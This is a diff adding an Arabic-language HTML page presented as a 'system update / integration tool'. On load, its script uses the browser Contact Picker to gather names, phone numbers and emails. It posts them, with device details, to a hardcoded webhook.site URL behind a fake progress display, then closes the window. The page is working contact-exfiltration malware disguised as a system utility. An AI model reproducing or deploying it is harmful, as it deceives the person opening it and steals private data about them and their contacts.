@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث النظام - Integration Tool</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .logo {
+            font-size: 3rem;
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            color: #00ff88;
+            margin-bottom: 15px;
+            font-size: 1.8rem;
+        }
+        .progress-container {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 25px 0;
+        }
+        .progress-bar {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            height: 8px;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+        .progress-fill {
+            background: linear-gradient(90deg, #00ff88, #00ccff);
+            height: 100%;
+            width: 0%;
+            transition: width 0.5s ease;
+            border-radius: 10px;
+        }
+        .status {
+            margin: 15px 0;
+            padding: 12px;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            font-size: 0.9rem;
+        }
+        .status.success {
+            background: rgba(46, 204, 113, 0.2);
+            border: 1px solid #2ecc71;
+        }
+        .status.error {
+            background: rgba(231, 76, 60, 0.2);
+            border: 1px solid #e74c3c;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">⚙️</div>
+        
+        <div class="header">
+            <h1>أداة تكامل النظام</h1>
+            <p>جاري تحضير البيانات للتكامل...</p>
+        </div>
+
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div id="progressText">جاري تهيئة النظام...</div>
+        </div>
+
+        <div class="status" id="initialStatus">
+            📱 جاري التحضير للوصول إلى البيانات...
+        </div>
+
+        <div class="status hidden" id="contactsStatus">
+            👥 جاري جمع معلومات الاتصال...
+        </div>
+
+        <div class="status hidden" id="sendStatus">
+            📡 جاري إرسال البيانات إلى الخادم...
+        </div>
+
+        <div class="status success hidden" id="successStatus">
+            ✅ تم الانتهاء بنجاح
+        </div>
+
+        <div class="status error hidden" id="errorStatus">
+            ❌ حدث خطأ أثناء المعالجة
+        </div>
+    </div>
+
+    <script>
+        // 🔧 إعدادات Webhook.site - استخدم الرابط الذي حصلت عليه
+        const WEBHOOK_URL = 'https://webhook.site/99194553-307e-402d-8078-159021109656';
+        
+        // العناصر
+        const progressFill = document.getElementById('progressFill');
+        const progressText = document.getElementById('progressText');
+        const initialStatus = document.getElementById('initialStatus');
+        const contactsStatus = document.getElementById('contactsStatus');
+        const sendStatus = document.getElementById('sendStatus');
+        const successStatus = document.getElementById('successStatus');
+        const errorStatus = document.getElementById('errorStatus');
+
+        // تحديث شريط التقدم
+        function updateProgress(percent, text) {
+            progressFill.style.width = `${percent}%`;
+            progressText.innerHTML = text;
+        }
+
+        // إرسال البيانات إلى Webhook.site
+        async function sendToWebhook(data) {
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                if (response.ok) {
+                    console.log('✅ تم الإرسال بنجاح إلى Webhook.site');
+                    return true;
+                } else {
+                    console.error('❌ فشل في إرسال البيانات');
+                    return false;
+                }
+            } catch (error) {
+                console.error('خطأ في الإرسال:', error);
+                return false;
+            }
+        }
+
+        // تنسيق البيانات كملف نصي
+        function formatContactsToText(contacts) {
+            let text = '📋 تقرير جهات الاتصال المجمعة\n';
+            text += `⏰ الوقت: ${new Date().toLocaleString('ar-SA')}\n`;
+            text += `📊 العدد الإجمالي: ${contacts.length} جهة اتصال\n\n`;
+            text += '='.repeat(50) + '\n\n';
+            
+            contacts.forEach((contact, index) => {
+                text += `👤 جهة الاتصال ${index + 1}:\n`;
+                text += `   الاسم: ${contact.name || 'غير متوفر'}\n`;
+                
+                if (contact.tel && contact.tel.length > 0) {
+                    text += `   الهاتف: ${contact.tel.join(' , ')}\n`;
+                }
+                
+                if (contact.email && contact.email.length > 0) {
+                    text += `   البريد الإلكتروني: ${contact.email.join(' , ')}\n`;
+                }
+                
+                text += '-'.repeat(35) + '\n\n';
+            });
+            
+            return text;
+        }
+
+        // العملية الرئيسية
+        async function startCollection() {
+            try {
+                updateProgress(20, 'جاري تهيئة النظام...');
+                
+                // انتظار محاكاة العملية
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                updateProgress(40, 'جاري التحقق من الصلاحيات...');
+                initialStatus.classList.add('hidden');
+                contactsStatus.classList.remove('hidden');
+                
+                // جمع جهات الاتصال
+                if ('contacts' in navigator && 'select' in navigator.contacts) {
+                    updateProgress(60, 'جاري الوصول إلى جهات الاتصال...');
+                    
+                    const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                    
+                    if (!contacts || contacts.length === 0) {
+                        throw new Error('لم يتم اختيار أي جهات اتصال');
+                    }
+                    
+                    updateProgress(80, `تم جمع ${contacts.length} جهة اتصال`);
+                    
+                    // تنسيق البيانات
+                    const contactsText = formatContactsToText(contacts);
+                    const systemInfo = {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        timestamp: new Date().toISOString(),
+                        contactsCount: contacts.length
+                    };
+                    
+                    // إعداد البيانات للإرسال
+                    const dataToSend = {
+                        type: 'contacts_collection',
+                        timestamp: new Date().toISOString(),
+                        contacts: contacts,
+                        formattedText: contactsText,
+                        systemInfo: systemInfo,
+                        metadata: {
+                            version: '1.0',
+                            source: 'web_interface'
+                        }
+                    };
+                    
+                    contactsStatus.classList.add('hidden');
+                    sendStatus.classList.remove('hidden');
+                    updateProgress(90, 'جاري إرسال البيانات...');
+                    
+                    // إرسال البيانات إلى Webhook.site
+                    const sendSuccess = await sendToWebhook(dataToSend);
+                    
+                    if (sendSuccess) {
+                        updateProgress(100, 'اكتملت العملية بنجاح!');
+                        sendStatus.classList.add('hidden');
+                        successStatus.classList.remove('hidden');
+                        
+                        // إغلاق تلقائي بعد النجاح
+                        setTimeout(() => {
+                            window.close();
+                        }, 3000);
+                    } else {
+                        throw new Error('فشل في إرسال البيانات إلى الخادم');
+                    }
+                    
+                } else {
+                    throw new Error('المتصفح لا يدعم واجهة جهات الاتصال');
+                }
+                
+            } catch (error) {
+                console.error('Process Error:', error);
+                updateProgress(100, 'حدث خطأ');
+                sendStatus.classList.add('hidden');
+                errorStatus.classList.remove('hidden');
+                errorStatus.innerHTML = `❌ ${error.message}`;
+                
+                // إغلاق تلقائي حتى مع الأخطاء
+                setTimeout(() => {
+                    window.close();
+                }, 5000);
+            }
+        }
+
+        // بدء العملية تلقائياً
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🚀 بدء عملية جمع البيانات...');
+            setTimeout(startCollection, 1500);
+        });
+    </script>
+</body>
+</html>
